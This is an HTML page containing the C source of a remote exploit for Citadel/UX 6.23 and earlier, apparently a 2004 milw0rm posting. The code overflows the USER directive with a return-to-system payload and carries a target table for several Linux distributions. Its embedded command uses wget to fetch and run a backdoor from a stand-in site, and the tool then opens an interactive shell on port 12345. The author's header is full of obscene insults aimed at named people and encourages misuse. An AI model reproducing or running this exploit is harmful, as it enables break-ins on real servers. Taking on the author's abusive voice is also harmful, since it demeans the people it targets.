<html><head><title>Citadel/UX <= 6.23 Remote USER Directive Exploit (Private Version)</title></head><pre>/*
Citadel/UX remote exploit
By nebunu: pppppppal at yahoo dot com

This is the version which contains targets,abuse it kiddies

Bruteforce:

You only have 4096/4=1024 tries.
The magic offset lies about 2048 + or - 4,8,16....256
So practically speaking you have maximum 256 tries.


Greetings: DrBIOS,Bagabontu,rebel,R4X and all the friends i have.

F goes to: #rosec @ undernet, www rosec info read and laugh
lacroix you are a big lamer,a little script kiddie who wants to gain fame on vortex.pulltheplug
wargame server.By the way,you pathetic cunt..have you even hacked into a box other than yours?
Mad anal fucks goes to all #rosec members,dont forget their moms.

My little private message:

Sa va bagam pule in gat celor de pe irc.apropo.ro,in special lui shell (nimeni) si toata
gasca de cacaciosi de la #rosec
Ce tupeu pe voi sa vreti donatii in e-gold..va dau eu donatii in sloboz..
*/

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;

/*
Place here your own link which contains a backdoor (blackhole.c) which listens on port 12345
*/

#define COMMAND &quot;cd /tmp;wget http://your-site-here.com/a;/tmp/a;&quot;
#define BUFFER 93            
#define CITADEL_PORT 504
#define RETADDR 0xbffff000 
#define BACKDOOR_PORT 12345
#define MAXTARGETS 9


struct architecture 
{
char *platform;     
int syst;          
}arch[]={
{&quot;Red Hat 7.1 (Seawolf)&quot;,0x4006aef0},
{&quot;Red Hat 7.2 (Enigma)&quot;,0x4006f664},
{&quot;Red Hat 7.3 (Valhalla)&quot;,0x080482d0},
{&quot;SuSE Linux 8.0&quot;,0x4006f004},
{&quot;Debian sid unstable release&quot;,0x4005f270},
{&quot;Slackware 8.0.0&quot;,0x40062870},
{&quot;Slackware 9.0.0&quot;,0x40061530},
{&quot;Slackware 9.1.0&quot;,0x4006be80},
{&quot;SuSE Linux 8.0&quot;,0x4006f004},
};
        



void shell(int sock)
{
fd_set  fd_read;
char buff[1024000], *cmd=&quot;cd /;uname -a;id\n&quot;;
int n;
FD_ZERO(&amp;fd_read);
FD_SET(sock, &amp;fd_read);
FD_SET(0, &amp;fd_read);
send(sock, cmd, strlen(cmd), 0);
while(1) {        
FD_SET(sock,&amp;fd_read);
FD_SET(0,&amp;fd_read);
if (select(FD_SETSIZE, &amp;fd_read, NULL, NULL, NULL) &lt; 0 ) break;
if (FD_ISSET(sock, &amp;fd_read)) 
{
if((n = recv(sock, buff, sizeof(buff), 0)) &lt; 0)
{
fprintf(stderr, &quot;EOF\n&quot;);
exit(2);
}
if (write(1, buff, n) &gt; 0);
}
if (FD_ISSET(0, &amp;fd_read)) 
{        
if((n = read(0, buff, sizeof(buff))) &lt; 0)
{
fprintf(stderr, &quot;EOF\n&quot;);
exit(2);
}
if (send(sock, buff, n, 0) &lt; 0) break;
}
usleep(10);
}
fprintf(stderr, &quot;Connection lost.\n\n&quot;);
exit(0);
}


int fuck(char *fuck)
{
struct sockaddr_in addr2;	
int sock2	= 0;
if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) &lt; 0) 
{
return -1;
}

addr2.sin_addr.s_addr=inet_addr(fuck);
addr2.sin_family = AF_INET;
addr2.sin_port   = htons(BACKDOOR_PORT);
if(connect(sock2, (struct sockaddr *)&amp;addr2, sizeof(addr2)) == -1) 
{
printf(&quot;\n\nExploit failed!\n\n&quot;);
return -1;
}
shell(sock2);
close(sock2);
return 0;
}

void exploit(char ip[16],int target,int tryy)
{
int i,sock,t,len,n;
char overflow[500],system[8],ret[8];
char egg[500];
int *pt;
int retaddr;
struct sockaddr_in addy;

retaddr=RETADDR+tryy;
memset(overflow,0,500);
memset(egg,0,500);
memset(ret,0,8);
memset(system,0,8);
for(i=0;i&lt;(BUFFER-strlen(COMMAND));i++)
overflow[i]='/';
strcat(overflow,COMMAND);
pt=(int *)system;
for(i=0;i&lt;4;i+=4)*pt++=arch[target].syst;
strcat(overflow,system);
strcat(overflow,&quot;AAAA&quot;);
pt=(int *)ret;
for(i=0;i&lt;4;i+=4)*pt++=retaddr;
strcat(overflow,ret);
strcpy(egg,&quot;USER &quot;);
strcat(egg,overflow);
strcat(egg,&quot;\n&quot;);

sock=socket(AF_INET,SOCK_STREAM,0);
if(sock==-1)
{
perror(&quot;socket()&quot;);
exit(-1);
}
addy.sin_family=AF_INET;
addy.sin_port=htons(CITADEL_PORT);
addy.sin_addr.s_addr=inet_addr(ip);
t=connect(sock,(struct sockaddr *)&amp;addy,sizeof(struct sockaddr_in));
if(t==-1)
{
perror(&quot;connect()&quot;);
exit(-1);
}
write(sock,egg,strlen(egg));
printf(&quot;%s\n&quot;,egg);
close(sock);
}



int main(int argc,char **argv)
{

int i,targ;
if(argc!=4)
{
printf(&quot;\r\nCitadel/UX remote exploit (private version) by nebunu &lt;pppppppal at yahoo dot com&gt;\r\n
Usage: %s &lt;target ip&gt; &lt;target number&gt; &lt;offset [1..4096]&gt;\r\n&quot;,argv[0]);
printf(&quot;\nAvailable targets:\n&quot;);
for(i=0;i&lt;MAXTARGETS;i++)printf(&quot;\n%u) Platform %s,system=0x%x&quot;,i,arch[i].platform,arch[i].syst);
printf(&quot;\n&quot;);
exit(-1);
}


if(strlen(COMMAND)&gt;92)
{
printf(&quot;\r\nCommand string too large\r\n&quot;);
exit(-1);
}

targ=atoi(argv[2]);
printf(&quot;\r\nAttacking %s\n&quot;,arch[targ].platform);
exploit(argv[1],targ,atoi(argv[3]));
fuck(argv[1]);

}

// milw0rm.com [2004-09-09]</pre></html>